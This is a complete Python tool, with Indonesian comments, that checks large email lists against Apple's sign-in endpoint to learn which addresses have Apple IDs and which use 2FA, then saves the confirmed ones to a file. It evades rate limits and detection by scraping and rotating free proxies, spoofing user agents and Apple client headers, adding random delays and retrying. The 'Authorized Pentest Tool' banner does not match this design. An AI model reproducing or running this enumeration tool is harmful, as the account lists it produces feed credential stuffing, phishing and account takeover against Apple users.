#!/usr/bin/env python3
"""
Apple Email Validator - Auto Proxy Grabber + Checker
Author: HackerAI
Version: 2.0 - Premium Interface
"""

import re
import sys
import json
import requests
import random
import time
import threading
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ========== KONFIGURASI WARNA ==========
class Warna:
    """Kelas warna untuk terminal yang menarik"""
    HEADER = '\033[95m'
    BIRU = '\033[94m'
    HIJAU = '\033[92m'
    KUNING = '\033[93m'
    MERAH = '\033[91m'
    CYAN = '\033[96m'
    PUTIH = '\033[97m'
    HITAM = '\033[90m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    RESET = '\033[0m'
    
    # Background
    BG_HITAM = '\033[40m'
    BG_MERAH = '\033[41m'
    BG_HIJAU = '\033[42m'
    BG_KUNING = '\033[43m'
    BG_BIRU = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_PUTIH = '\033[47m'
    
    @staticmethod
    def cetak(teks, warna=PUTIH, bold=False, blink=False, bg=None):
        """Cetak teks dengan warna"""
        fmt = ""
        if bold:
            fmt += Warna.BOLD
        if blink:
            fmt += Warna.BLINK
        if bg:
            fmt += bg
        fmt += warna + teks + Warna.RESET
        return fmt

# ========== BANNER ==========
BANNER = f"""
{Warna.cetak('╔══════════════════════════════════════════════════════════════╗', Warna.CYAN, bold=True)}
{Warna.cetak('║', Warna.CYAN, bold=True)}          {Warna.cetak('🍎 APPLE ID VALIDATOR v2.0', Warna.HIJAU, bold=True)}          {Warna.cetak('║', Warna.CYAN, bold=True)}
{Warna.cetak('║', Warna.CYAN, bold=True)}     {Warna.cetak('Auto Proxy Grabber + Email Checker', Warna.KUNING)}     {Warna.cetak('║', Warna.CYAN, bold=True)}
{Warna.cetak('║', Warna.CYAN, bold=True)}          {Warna.cetak('Authorized Pentest Tool', Warna.MERAH, bold=True)}          {Warna.cetak('║', Warna.CYAN, bold=True)}
{Warna.cetak('╚══════════════════════════════════════════════════════════════╝', Warna.CYAN, bold=True)}
"""

# ========== KONFIGURASI ==========
APPLE_AUTH_URL = "https://idmsa.apple.com/appleauth/auth/signin"
TIMEOUT = 15
MAX_THREADS = 10
PROXY_TEST_URL = "https://httpbin.org/ip"
PROXY_TEST_TIMEOUT = 10
MIN_PROXIES = 30
MAX_RETRY_PER_EMAIL = 15  # Max retry untuk 1 email dengan proxy berbeda

# ========== USER-AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

# ========== PROXY GRABBER ==========
class ProxyGrabber:
    """Auto fetch proxy dari berbagai sumber free proxy list"""
    
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.lock = threading.Lock()
        
        self.sources = [
            self._grab_geonode,
            self._grab_free_proxy_list,
            self._grab_proxy_list_download,
            self._grab_sslproxies,
    
        ]
    
    def _grab_geonode(self):
        proxies = []
        try:
            urls = [
                "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps",
                "https://proxylist.geonode.com/api/proxy-list?limit=100&page=2&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps",
            ]
            for url in urls:
                r = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
                if r.status_code == 200:
                    data = r.json()
                    for p in data.get('data', []):
                        ip = p.get('ip', '')
                        port = p.get('port', '')
                        protocols = p.get('protocols', ['http'])
                        if ip and port:
                            proto = 'http' if 'http' in str(protocols).lower() else 'https'
                            proxies.append(f"{proto}://{ip}:{port}")
            print(f"  {Warna.cetak('✓', Warna.HIJAU)} GeoNode: {Warna.cetak(str(len(proxies)), Warna.KUNING)} proxies")
        except Exception as e:
            print(f"  {Warna.cetak('✗', Warna.MERAH)} GeoNode: {str(e)[:30]}")
        return proxies
    
   
    def _grab_free_proxy_list(self):
        proxies = []
        try:
            url = "https://free-proxy-list.net/"
            r = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
            if r.status_code == 200:
                pattern = r'<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td><td>[^<]*</td><td[^>]*>([^<]*)</td>'
                matches = re.findall(pattern, r.text)
                for ip, port, https in matches:
                    proto = 'https' if 'yes' in https.lower() else 'http'
                    proxies.append(f"{proto}://{ip}:{port}")
            print(f"  {Warna.cetak('✓', Warna.HIJAU)} FreeProxyList: {Warna.cetak(str(len(proxies)), Warna.KUNING)} proxies")
        except Exception as e:
            print(f"  {Warna.cetak('✗', Warna.MERAH)} FreeProxyList: {str(e)[:30]}")
        return proxies
    
    def _grab_proxy_list_download(self):
        proxies = []
        try:
            urls = [
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://www.proxy-list.download/api/v1/get?type=https",
            ]
            for url in urls:
                r = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
                if r.status_code == 200:
                    for line in r.text.strip().split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            if not line.startswith(('http://', 'https://')):
                                line = f"http://{line}"
                            proxies.append(line)
            print(f"  {Warna.cetak('✓', Warna.HIJAU)} ProxyListDownload: {Warna.cetak(str(len(proxies)), Warna.KUNING)} proxies")
        except Exception as e:
            print(f"  {Warna.cetak('✗', Warna.MERAH)} ProxyListDownload: {str(e)[:30]}")
        return proxies
    
    def _grab_sslproxies(self):
        proxies = []
        try:
            url = "https://www.sslproxies.org/"
            r = requests.get(url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
            if r.status_code == 200:
                pattern = r'<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>'
                matches = re.findall(pattern, r.text)
                for ip, port in matches:
                    proxies.append(f"http://{ip}:{port}")
            print(f"  {Warna.cetak('✓', Warna.HIJAU)} SSLProxies: {Warna.cetak(str(len(proxies)), Warna.KUNING)} proxies")
        except Exception as e:
            print(f"  {Warna.cetak('✗', Warna.MERAH)} SSLProxies: {str(e)[:30]}")
        return proxies
    
     
    def fetch_all(self):
        print(f"\n{Warna.cetak('╔══════════════════════════════════════════════════════════════╗', Warna.CYAN, bold=True)}")
        print(f"{Warna.cetak('║', Warna.CYAN, bold=True)}          {Warna.cetak('🌐 FETCHING PROXIES FROM ALL SOURCES', Warna.KUNING, bold=True)}          {Warna.cetak('║', Warna.CYAN, bold=True)}")
        print(f"{Warna.cetak('╚══════════════════════════════════════════════════════════════╝', Warna.CYAN, bold=True)}")
        
        all_proxies = []
        
        for source_func in self.sources:
            try:
                proxies = source_func()
                all_proxies.extend(proxies)
            except Exception as e:
                print(f"  {Warna.cetak('!', Warna.MERAH)} Source error: {e}")
        
        all_proxies = list(set(all_proxies))
        print(f"\n  {Warna.cetak('▶', Warna.CYAN, bold=True)} Total unique proxies: {Warna.cetak(str(len(all_proxies)), Warna.HIJAU, bold=True)}")
        
        with self.lock:
            self.proxies = all_proxies
        
        return all_proxies
    
    def test_proxy(self, proxy_url):
        try:
            proxies = {"http": proxy_url, "https": proxy_url}
            r = requests.get(
                PROXY_TEST_URL,
                proxies=proxies,
                timeout=PROXY_TEST_TIMEOUT,
                headers={"User-Agent": random.choice(USER_AGENTS)},
                verify=False
            )
            if r.status_code == 200:
                return True, r.json().get('origin', '')
            return False, None
        except:
            return False, None
    
    def validate_proxies(self, max_workers=50):
        print(f"\n{Warna.cetak('╔══════════════════════════════════════════════════════════════╗', Warna.CYAN, bold=True)}")
        print(f"{Warna.cetak('║', Warna.CYAN, bold=True)}          {Warna.cetak('🔍 VALIDATING PROXIES', Warna.KUNING, bold=True)}                    {Warna.cetak('║', Warna.CYAN, bold=True)}")
        print(f"{Warna.cetak('╚══════════════════════════════════════════════════════════════╝', Warna.CYAN, bold=True)}")
        
        print(f"  {Warna.cetak('Testing', Warna.PUTIH)} {Warna.cetak(str(len(self.proxies)), Warna.KUNING)} {Warna.cetak('proxies...', Warna.PUTIH)}")
        
        working = []
        failed = 0
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self.test_proxy, proxy): proxy 
                for proxy in self.proxies
            }
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                proxy = futures[future]
                is_working, ip = future.result()
                
                if is_working:
                    working.append(proxy)
                else:
                    failed += 1
                
                if completed % 100 == 0 or completed == len(self.proxies):
                    progress = int((completed / len(self.proxies)) * 20)
                    bar = '█' * progress + '░' * (20 - progress)
                    print(f"\r  {Warna.cetak('[' + bar + ']', Warna.CYAN)} {Warna.cetak(str(completed)+'/'+str(len(self.proxies)), Warna.KUNING)} | {Warna.cetak('✓', Warna.HIJAU)} {len(working)} | {Warna.cetak('✗', Warna.MERAH)} {failed}", end='')
        
        print()
        with self.lock:
            self.working_proxies = working
        
        print(f"\n  {Warna.cetak('▶', Warna.CYAN, bold=True)} Working proxies: {Warna.cetak(str(len(working)), Warna.HIJAU, bold=True)}/{len(self.proxies)}")
        return working

# ========== PROXY ROTATOR ==========
class ProxyRotator:
    def __init__(self, proxy_list):
        self.proxies = proxy_list
        self.index = 0
        self.lock = threading.Lock()
        self.used_proxies = set()
    
    def get_fresh_proxy(self):
        """Ambil proxy yang belum dipakai untuk email ini"""
        with self.lock:
            available = [p for p in self.proxies if p not in self.used_proxies]
            if not available:
                # Reset jika semua sudah dipakai
                self.used_proxies.clear()
                available = self.proxies
            
            proxy = random.choice(available)
            self.used_proxies.add(proxy)
            return {"http": proxy, "https": proxy}
    
    def get_random_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = random.choice(self.proxies)
            return {"http": proxy, "https": proxy}
    
    def reset_used(self):
        with self.lock:
            self.used_proxies.clear()

# ========== HEADERS GENERATOR ==========
def generate_headers():
    ua = random.choice(USER_AGENTS)
    
    if "Macintosh" in ua:
        os_info = f"macOS/{random.choice(['10.15.7 (19H2)', '11.6.1 (20G224)', '12.6.3 (21G419)', '13.5.2 (22G91)', '14.2.1 (23C71)'])} AppleWebKit/537.36"
    elif "Windows" in ua:
        os_info = f"Windows/{random.choice(['10.0.19045', '10.0.22621', '10.0.22000'])}"
    elif "iPhone" in ua:
        os_info = f"iPhone/{random.choice(['17.2', '17.1.2', '17.0.3', '16.6.1'])}"
    elif "iPad" in ua:
        os_info = f"iPad/{random.choice(['17.2', '17.1', '16.6'])}"
    else:
        os_info = "Linux/x86_64"
    
    return {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.7"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://appleid.apple.com",
        "Referer": "https://appleid.apple.com/",
        "X-Apple-I-FD-Client-Info": f'{{"U":"{ua}","L":"en-US","Z":"GMT+{random.choice(["05","06","07","08","09","10","11"])}:00","V":"1.1","F":"_af=1"}}',
        "X-Apple-I-Client-Info": os_info,
        "X-Apple-I-Request-Context": random.choice(["signin", "auth", "login"]),
        "X-Apple-I-Request-Info": "com.apple.gs.appleid.apple.com",
        "Cache-Control": "no-cache",
    }

# ========== DELAY MANAGER ==========
class DelayManager:
    def __init__(self, min_delay=1.5, max_delay=4.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
    
    def wait(self):
        delay = random.uniform(self.min_delay, self.max_delay)
        time.sleep(delay)

# ========== APPLE ID CHECKER (DENGAN RETRY) ==========
def check_apple_id_with_retry(email, proxy_rotator, delay_mgr, max_retries=MAX_RETRY_PER_EMAIL):
    """
    Cek Apple ID dengan retry otomatis ganti proxy sampai dapat hasil pasti
    """
    retry_count = 0
    last_error = None
    
    while retry_count < max_retries:
        retry_count += 1
        
        try:
            session = requests.Session()
            session.verify = False
            
            # Set proxy FRESH (belum dipakai untuk email ini)
            if proxy_rotator:
                proxy_dict = proxy_rotator.get_fresh_proxy()
                if proxy_dict:
                    session.proxies.update(proxy_dict)
            
            headers = generate_headers()
            
            if delay_mgr:
                delay_mgr.wait()
            
            # GET sign-in page
            try:
                resp1 = session.get(
                    "https://appleid.apple.com/sign-in",
                    headers=headers,
                    timeout=TIMEOUT
                )
                if resp1.status_code not in [200, 302]:
                    if resp1.status_code == 503:
                        last_error = "SERVICE_BUSY"
                        continue  # Retry with different proxy
                    elif resp1.status_code == 429:
                        last_error = "RATE_LIMITED"
                        time.sleep(random.uniform(3, 7))
                        continue
                    else:
                        last_error = f"BLOCKED_{resp1.status_code}"
                        continue
            except Exception as e:
                last_error = f"PROXY_ERROR"
                continue  # Retry with different proxy
            
            session.cookies.update(resp1.cookies)
            
            if delay_mgr:
                delay_mgr.wait()
            
            # POST signin
            headers2 = generate_headers()
            payload = {"accountName": email, "password": ""}
            
            try:
                resp2 = session.post(
                    APPLE_AUTH_URL,
                    json=payload,
                    headers=headers2,
                    timeout=TIMEOUT
                )
            except Exception as e:
                last_error = "PROXY_ERROR"
                continue
            
            status_code = resp2.status_code
            
            # ===== ANALISIS HASIL =====
            if status_code == 401:
                try:
                    data = resp2.json()
                    for err in data.get('serviceErrors', []):
                        code = str(err.get('code', ''))
                        if '-20201' in code:
                            return {"email": email, "exists": False, "status": "NOT_FOUND", "detail": "Tidak terdaftar", "retries": retry_count}
                        if '-20101' in code:
                            return {"email": email, "exists": True, "status": "EXISTS", "detail": "Terdaftar", "retries": retry_count}
                except:
                    pass
                return {"email": email, "exists": True, "status": "LIKELY_EXISTS", "detail": "401 - kemungkinan terdaftar", "retries": retry_count}
            
            elif status_code == 409:
                return {"email": email, "exists": True, "status": "EXISTS_2FA", "detail": "Terdaftar dengan 2FA", "retries": retry_count}
            
            elif status_code == 200:
                return {"email": email, "exists": True, "status": "EXISTS", "detail": "Akun aktif", "retries": retry_count}
            
            elif status_code == 503:
                last_error = "SERVICE_BUSY"
                time.sleep(random.uniform(2, 5))
                continue
            
            elif status_code == 429:
                last_error = "RATE_LIMITED"
                time.sleep(random.uniform(5, 10))
                continue
            
            else:
                last_error = f"UNKNOWN_{status_code}"
                continue
                
        except Exception as e:
            last_error = "ERROR"
            continue
    
    # Jika semua retry gagal
    return {"email": email, "exists": None, "status": "FAILED", "detail": f"Gagal setelah {max_retries} retry ({last_error})", "retries": max_retries}

# ========== BATCH PROCESSOR ==========
def process_emails_from_file(filepath):
    emails = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                email = line.strip()
                if email and '@' in email:
                    emails.append(email)
    except FileNotFoundError:
        print(f"\n  {Warna.cetak('✗', Warna.MERAH)} File tidak ditemukan: {filepath}")
        sys.exit(1)
    return emails

def batch_check(emails, proxy_rotator, max_threads=MAX_THREADS):
    results = []
    delay_mgr = DelayManager(1.5, 4.0)
    
    print(f"\n{Warna.cetak('╔══════════════════════════════════════════════════════════════╗', Warna.CYAN, bold=True)}")
    print(f"{Warna.cetak('║', Warna.CYAN, bold=True)}          {Warna.cetak('📧 CHECKING APPLE IDS', Warna.HIJAU, bold=True)}                     {Warna.cetak('║', Warna.CYAN, bold=True)}")
    print(f"{Warna.cetak('╚══════════════════════════════════════════════════════════════╝', Warna.CYAN, bold=True)}")
    
    print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Emails: {Warna.cetak(str(len(emails)), Warna.KUNING, bold=True)}")
    print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Threads: {Warna.cetak(str(max_threads), Warna.KUNING, bold=True)}")
    print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Max retry/email: {Warna.cetak(str(MAX_RETRY_PER_EMAIL), Warna.KUNING, bold=True)}")
    if proxy_rotator:
        print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Proxy pool: {Warna.cetak(str(len(proxy_rotator.proxies)), Warna.KUNING, bold=True)}")
    print()
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(check_apple_id_with_retry, email, proxy_rotator, delay_mgr): email 
            for email in emails
        }
        
        completed = 0
        for future in as_completed(futures):
            completed += 1
            result = future.result()
            results.append(result)
            
            email = result['email']
            status = result['status']
            detail = result['detail']
            retries = result.get('retries', 1)
            
            # Ikon dan warna berdasarkan status
            if status in ["EXISTS", "EXISTS_2FA"]:
                icon = f"{Warna.cetak('✓', Warna.HIJAU, bold=True)}"
                status_color = Warna.HIJAU
            elif status == "LIKELY_EXISTS":
                icon = f"{Warna.cetak('~', Warna.KUNING, bold=True)}"
                status_color = Warna.KUNING
            elif status == "NOT_FOUND":
                icon = f"{Warna.cetak('✗', Warna.MERAH, bold=True)}"
                status_color = Warna.MERAH
            elif status == "FAILED":
                icon = f"{Warna.cetak('?', Warna.MERAH, bold=True)}"
                status_color = Warna.MERAH
            else:
                icon = f"{Warna.cetak('?', Warna.PUTIH)}"
                status_color = Warna.PUTIH
            
            # Format output
            email_display = email[:30].ljust(30)
            status_display = status.ljust(13)
            retry_display = f"({retries}x)" if retries > 1 else "    "
            
            print(f"  {icon} [{completed}/{len(emails)}] {Warna.cetak(email_display, Warna.PUTIH)} {Warna.cetak(status_display, status_color, bold=True)} {Warna.cetak(retry_display, Warna.KUNING)} {Warna.cetak('|', Warna.HITAM)} {detail}")
    
    return results

def print_summary(results):
    total = len(results)
    exists = sum(1 for r in results if r.get("exists") is True)
    not_found = sum(1 for r in results if r.get("exists") is False)
    failed = sum(1 for r in results if r.get("status") == "FAILED")
    
    print(f"\n{Warna.cetak('╔══════════════════════════════════════════════════════════════╗', Warna.CYAN, bold=True)}")
    print(f"{Warna.cetak('║', Warna.CYAN, bold=True)}               {Warna.cetak('📊 RINGKASAN HASIL', Warna.HIJAU, bold=True)}                {Warna.cetak('║', Warna.CYAN, bold=True)}")
    print(f"{Warna.cetak('╚══════════════════════════════════════════════════════════════╝', Warna.CYAN, bold=True)}")
    
    print(f"\n  {Warna.cetak('Total dicek', Warna.PUTIH)}       : {Warna.cetak(str(total), Warna.BIRU, bold=True)}")
    print(f"  {Warna.cetak('✓ Terdaftar', Warna.HIJAU, bold=True)}       : {Warna.cetak(str(exists), Warna.HIJAU, bold=True)}")
    print(f"  {Warna.cetak('✗ Tidak terdaftar', Warna.MERAH, bold=True)} : {Warna.cetak(str(not_found), Warna.MERAH, bold=True)}")
    if failed > 0:
        print(f"  {Warna.cetak('? Gagal', Warna.KUNING, bold=True)}          : {Warna.cetak(str(failed), Warna.KUNING, bold=True)}")
    
    # Progress bar visual
    if total > 0:
        persen_exists = (exists / total) * 100
        persen_notfound = (not_found / total) * 100
        bar_exists = int(persen_exists / 5)
        bar_notfound = int(persen_notfound / 5)
        bar_failed = 20 - bar_exists - bar_notfound
        
        bar = f"{Warna.cetak('█' * bar_exists, Warna.HIJAU)}{Warna.cetak('█' * bar_notfound, Warna.MERAH)}{Warna.cetak('░' * bar_failed, Warna.HITAM)}"
        print(f"\n  {bar} {Warna.cetak(f'{persen_exists:.0f}%', Warna.HIJAU)} / {Warna.cetak(f'{persen_notfound:.0f}%', Warna.MERAH)}")
    
    return exists

def save_results(results, output_file):
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\n  {Warna.cetak('✓', Warna.HIJAU)} Hasil disimpan ke: {Warna.cetak(output_file, Warna.KUNING)}")

# ========== MAIN ==========
def main():
    # Bersihkan terminal
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Tampilkan banner
    print(BANNER)
    
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Apple Email Validator - Auto Proxy Grabber + Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-e", "--email", help="Email tunggal")
    group.add_argument("-f", "--file", help="File daftar email")
    
    parser.add_argument("-o", "--output", help="File output JSON")
    parser.add_argument("-t", "--threads", type=int, default=MAX_THREADS, help=f"Threads (default: {MAX_THREADS})")
    parser.add_argument("--min-proxies", type=int, default=MIN_PROXIES, help=f"Min proxy (default: {MIN_PROXIES})")
    parser.add_argument("--no-validate", action="store_true", help="Skip proxy validation")
    parser.add_argument("--save-proxies", help="Simpan proxy ke file")
    parser.add_argument("--max-retry", type=int, default=MAX_RETRY_PER_EMAIL, help=f"Max retry/email (default: {MAX_RETRY_PER_EMAIL})")
    
    args = parser.parse_args()
    

    # Load emails
    if args.email:
        emails = [args.email]
    else:
        emails = process_emails_from_file(args.file)
    
    if not emails:
        print(f"\n  {Warna.cetak('✗', Warna.MERAH)} Tidak ada email untuk diproses")
        sys.exit(1)
    
    print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Total emails: {Warna.cetak(str(len(emails)), Warna.KUNING, bold=True)}")
    print(f"  {Warna.cetak('▶', Warna.CYAN, bold=True)} Max retry/email: {Warna.cetak(str(MAX_RETRY_PER_EMAIL), Warna.KUNING, bold=True)}")
    
    # ===== AUTO GRAB PROXY =====
    grabber = ProxyGrabber()
    all_proxies = grabber.fetch_all()
    
    if len(all_proxies) < args.min_proxies:
        print(f"\n  {Warna.cetak('!', Warna.KUNING)} Hanya {len(all_proxies)} proxy, minimal {args.min_proxies}. Fetch ulang...")
        time.sleep(2)
        all_proxies = grabber.fetch_all()
    
    # Validate proxy
    working_proxies = all_proxies
    if not args.no_validate:
        working_proxies = grabber.validate_proxies(max_workers=50)
    
    if not working_proxies:
        print(f"\n  {Warna.cetak('✗', Warna.MERAH)} Tidak ada proxy working! Coba direct connection...")
        proxy_rotator = None
    else:
        print(f"\n  {Warna.cetak('✓', Warna.HIJAU)} Menggunakan {Warna.cetak(str(len(working_proxies)), Warna.HIJAU, bold=True)} working proxies")
        
        if args.save_proxies:
            with open(args.save_proxies, 'w') as f:
                for p in working_proxies:
                    f.write(p + '\n')
            print(f"  {Warna.cetak('✓', Warna.HIJAU)} Proxy disimpan ke: {Warna.cetak(args.save_proxies, Warna.KUNING)}")
        
        proxy_rotator = ProxyRotator(working_proxies)
    
    # ===== CHECK EMAILS =====
    results = batch_check(emails, proxy_rotator, args.threads)
    
    # ===== OUTPUT =====
    valid_count = print_summary(results)
    
    if args.output:
        save_results(results, args.output)
    
    # Auto save valid emails
    valid_emails = [r["email"] for r in results if r.get("exists") is True]
    if valid_emails:
        with open("valid_apple_ids.txt", 'w') as f:
            for em in valid_emails:
                f.write(em + '\n')
        print(f"\n  {Warna.cetak('✓', Warna.HIJAU)} {len(valid_emails)} email valid disimpan ke: {Warna.cetak('valid_apple_ids.txt', Warna.KUNING, bold=True)}")
    
    # Footer
    print(f"\n{Warna.cetak('═' * 60, Warna.CYAN)}")
    print(f"{Warna.cetak('  🍎 Apple ID Validator v2.0 - Selesai!', Warna.HIJAU, bold=True)}")
    print(f"{Warna.cetak('  ⏱', Warna.CYAN)} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Warna.cetak('═' * 60, Warna.CYAN)}")

if __name__ == "__main__":
    main()